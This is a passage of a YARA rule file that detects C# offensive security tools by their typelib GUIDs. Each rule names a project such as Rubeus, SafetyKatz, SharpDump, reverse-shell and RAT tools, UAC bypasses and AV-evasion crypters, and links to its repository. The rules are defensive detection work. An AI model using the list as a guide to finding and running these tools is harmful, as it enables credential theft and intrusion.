red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"51c6e016-1428-441d-82e9-bb0eb599bbc8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Obfuscator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Obfuscator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8fe5b811-a2cb-417f-af93-6a3cf6650af1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SafetyKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SafetyKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8347e81b-89fc-42a9-b22c-f59a6a572dec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Dropless_Malware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Dropless-Malware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"23b739f7-2355-491e-a7cd-a8485d39d6d6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UAC_SilentClean {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/UAC-SilentClean\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"948152a4-a4a1-4260-a224-204255bfee72\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DesktopGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/DesktopGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6aa0cd5-9537-47a0-8c85-1fbe284a4380\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_wsManager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guillaC/wsManager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9480809e-5472-44f3-b076-dcdf7379e766\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UglyEXe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fashionproof/UglyEXe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"233de44b-4ec1-475d-a7d6-16da48d6fc8d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"79c9bba3-a0ea-431c-866c-77004802d8a0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EducationalRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/EducationalRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a18fbcf-8cac-482d-8ab7-08a44f0e278e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stealth_Kid_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ctsecurity/Stealth-Kid-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bf43cd33-c259-4711-8a0e-1a5c6c13811d\" ascii nocase wide\n        $typelibguid1 = \"e5b9df9b-a9e4-4754-8731-efc4e2667d88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCradle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpCradle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f70d2b71-4aae-4b24-9dae-55bc819c78bb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cnsimo/BypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4e7c140d-bcc4-4b15-8c11-adb4e54cc39a\" ascii nocase wide\n        $typelibguid1 = \"cec553a7-1370-4bbc-9aae-b2f5dbde32b0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_hanzoInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P0cL4bs/hanzoInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"32e22e25-b033-4d98-a0b3-3d2c3850f06c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_clr_meterpreter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/OJ/clr-meterpreter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6840b249-1a0e-433b-be79-a927696ea4b3\" ascii nocase wide\n        $typelibguid1 = \"67c09d37-ac18-4f15-8dd6-b5da721c0df6\" ascii nocase wide\n        $typelibguid2 = \"e05d0deb-d724-4448-8c4c-53d6a8e670f3\" ascii nocase wide\n        $typelibguid3 = \"c3cc72bf-62a2-4034-af66-e66da73e425d\" ascii nocase wide\n        $typelibguid4 = \"7ace3762-d8e1-4969-a5a0-dcaf7b18164e\" ascii nocase wide\n        $typelibguid5 = \"3296e4a3-94b5-4232-b423-44f4c7421cb3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BYTAGE {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/KNIF/BYTAGE\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8e46ba56-e877-4dec-be1e-394cb1b5b9de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MultiOS_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/belane/MultiOS_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"df0dd7a1-9f6b-4b0f-801e-e17e73b0801d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HideFromAMSI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0r13lc0ch4v1/HideFromAMSI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b91d2d44-794c-49b8-8a75-2fbec3fe3fe3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetAVBypass_Master {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/lockfale/DotNetAVBypass-Master\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4854c8dc-82b0-4162-86e0-a5bbcbc10240\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDPAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDPAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5f026c27-f8e6-4052-b231-8451c6a73838\" ascii nocase wide\n        $typelibguid1 = \"2f00a05b-263d-4fcc-846b-da82bd684603\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Telegra_Csharp_C2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sf197/Telegra_Csharp_C2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1d79fabc-2ba2-4604-a4b6-045027340c85\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCompile {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/SharpCompile\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"63f81b73-ff18-4a36-b095-fdcb4776da4c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Carbuncle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Carbuncle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3f239b73-88ae-413b-b8c8-c01a35a0d92e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OSSFileTool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/B1eed/OSSFileTool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"207aca5d-dcd6-41fb-8465-58b39efcde8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Rubeus {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/Rubeus\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"658c8b7f-3664-4a95-9572-a3e5871dfc06\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Simple_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cribdragg3r/Simple-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"035ae711-c0e9-41da-a9a2-6523865e8694\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Minidump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Minidump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"15c241aa-e73c-4b38-9489-9a344ac268a3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FatRodzianko/SharpBypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0d588c86-c680-4b0d-9aed-418f1bb94255\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpPack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Lexus89/SharpPack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid1 = \"b59c7741-d522-4a41-bf4d-9badddebb84a\" ascii nocase wide\n        $typelibguid2 = \"fd6bdf7a-fef4-4b28-9027-5bf750f08048\" ascii nocase wide\n        $typelibguid3 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n        $typelibguid5 = \"f3037587-1a3b-41f1-aa71-b026efdb2a82\" ascii nocase wide\n        $typelibguid6 = \"41a90a6a-f9ed-4a2f-8448-d544ec1fd753\" ascii nocase wide\n        $typelibguid7 = \"3787435b-8352-4bd8-a1c6-e5a1b73921f4\" ascii nocase wide\n        $typelibguid8 = \"fdd654f5-5c54-4d93-bf8e-faf11b00e3e9\" ascii nocase wide\n        $typelibguid9 = \"aec32155-d589-4150-8fe7-2900df4554c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Salsa_tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hackplayers/Salsa-tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"276004bb-5200-4381-843c-934e4c385b66\" ascii nocase wide\n        $typelibguid1 = \"cfcbf7b6-1c69-4b1f-8651-6bdb4b55f6b9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsDefender_Payload_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/notkohlrexo/WindowsDefender-Payload-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2f8b4d26-7620-4e11-b296-bc46eba3adfc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Privilege_Escalation {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/Privilege_Escalation\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ed54b904-5645-4830-8e68-52fd9ecbb2eb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Marauder {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/maraudershell/Marauder\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fff0a9a3-dfd4-402b-a251-6046d765ad78\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AV_Evasion_Tool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/1y0n/AV_Evasion_Tool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1937ee16-57d7-4a5f-88f4-024244f19dc6\" ascii nocase wide\n        $typelibguid1 = \"7898617d-08d2-4297-adfe-5edd5c1b828b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Fenrir {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Fenrir\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aecec195-f143-4d02-b946-df0e1433bd2e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_StormKitty {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/StormKitty\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a16abbb4-985b-4db2-a80c-21268b26c73d\" ascii nocase wide\n        $typelibguid1 = \"98075331-1f86-48c8-ae29-29da39a8f98b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Crypter_Runtime_AV_s_bypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/netreverse/Crypter-Runtime-AV-s-bypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c25e39a9-8215-43aa-96a3-da0e9512ec18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RunAsUser {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/atthacks/RunAsUser\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9dff282c-93b9-4063-bf8a-b6798371d35a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HWIDbypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/yunseok/HWIDbypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"47e08791-d124-4746-bc50-24bd1ee719a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_XORedReflectiveDLL {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/XORedReflectiveDLL\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c0e49392-04e3-4abb-b931-5202e0eb4c73\" ascii nocase wide\n        $typelibguid1 = \"30eef7d6-cee8-490b-829f-082041bc3141\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_Suite {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Sharp-Suite\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"467ee2a9-2f01-4a71-9647-2a2d9c31e608\" ascii nocase wide\n        $typelibguid1 = \"5611236e-2557-45b8-be29-5d1f074d199e\" ascii nocase wide\n        $typelibguid2 = \"447edefc-b429-42bc-b3bc-63a9af19dbd6\" ascii nocase wide\n        $typelibguid3 = \"eacaa2b8-43e5-4888-826d-2f6902e16546\" ascii nocase wide\n        $typelibguid4 = \"a3b7c697-4bb6-455d-9fda-4ab54ae4c8d2\" ascii nocase wide\n        $typelibguid5 = \"a5f883ce-1f96-4456-bb35-40229191420c\" ascii nocase wide\n        $typelibguid6 = \"28978103-d90d-4618-b22e-222727f40313\" ascii nocase wide\n        $typelibguid7 = \"252676f8-8a19-4664-bfb8-5a947e48c32a\" ascii nocase wide\n        $typelibguid8 = \"414187db-5feb-43e5-a383-caa48b5395f1\" ascii nocase wide\n        $typelibguid9 = \"0c70c839-9565-4881-8ea1-408c1ebe38ce\" ascii nocase wide\n        $typelibguid10 = \"0a382d9a-897f-431a-81c2-a4e08392c587\" ascii nocase wide\n        $typelibguid11 = \"629f86e6-44fe-4c9c-b043-1c9b64be6d5a\" ascii nocase wide\n        $typelibguid12 = \"f0d28809-b712-4380-9a59-407b7b2badd5\" ascii nocase wide\n        $typelibguid13 = \"956a5a4d-2007-4857-9259-51cd0fb5312a\" ascii nocase wide\n        $typelibguid14 = \"53f622eb-0ca3-4e9b-9dc8-30c832df1c7b\" ascii nocase wide\n        $typelibguid15 = \"72019dfe-608e-4ab2-a8f1-66c95c425620\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_rat_shell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/stphivos/rat-shell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7a15f8f6-6ce2-4ca4-919d-2056b70cc76a\" ascii nocase wide\n        $typelibguid1 = \"1659d65d-93a8-4bae-97d5-66d738fc6f6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_dotnet_gargoyle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/countercept/dotnet-gargoyle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76435f79-f8af-4d74-8df5-d598a551b895\" ascii nocase wide\n        $typelibguid1 = \"5a3fc840-5432-4925-b5bc-abc536429cb5\" ascii nocase wide\n        $typelibguid2 = \"6f0bbb2a-e200-4d76-b8fa-f93c801ac220\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_aresskit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/aresskit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8dca0e42-f767-411d-9704-ae0ba4a44ae8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DLL_Injector {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tmthrgd/DLL-Injector\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4581a449-7d20-4c59-8da2-7fd830f1fd5e\" ascii nocase wide\n        $typelibguid1 = \"05f4b238-25ce-40dc-a890-d5bbb8642ee4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TruffleSnout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dsnezhkov/TruffleSnout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"33842d77-bce3-4ee8-9ee2-9769898bb429\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Anti_Analysis {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Anti-Analysis\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3092c8df-e9e4-4b75-b78e-f81a0058a635\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BackNet {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/valsov/BackNet\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9fdae122-cd1e-467d-a6fa-a98c26e76348\" ascii nocase wide\n        $typelibguid1 = \"243c279e-33a6-46a1-beab-2864cc7a499f\" ascii nocase wide\n        $typelibguid2 = \"a7301384-7354-47fd-a4c5-65b74e0bbb46\" ascii nocase wide\n        $typelibguid3 = \"982dc5b6-1123-428a-83dd-d212490c859f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AllTheThings {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/johnjohnsp1/AllTheThings\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0547ff40-5255-42a2-beb7-2ff0dbf7d3ba\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AddReferenceDotRedTeam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ceramicskate0/AddReferenceDotRedTeam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"73c79d7e-17d4-46c9-be5a-ecef65b924e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Crypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Crypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f93c99ed-28c9-48c5-bb90-dd98f18285a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BrowserGhost {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/BrowserGhost\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2133c634-4139-466e-8983-9a23ec99e01b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tothi/SharpShot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"057aef75-861b-4e4b-a372-cfbd8322c8e1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Offensive__NET {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mrjamiebowman/Offensive-.NET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"11fe5fae-b7c1-484a-b162-d5578a802c9c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RuralBishop {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/RuralBishop\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe4414d9-1d7e-4eeb-b781-d278fe7a5619\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DeviceGuardBypasses {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DeviceGuardBypasses\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f318466d-d310-49ad-a967-67efbba29898\" ascii nocase wide\n        $typelibguid1 = \"3705800f-1424-465b-937d-586e3a622a4f\" ascii nocase wide\n      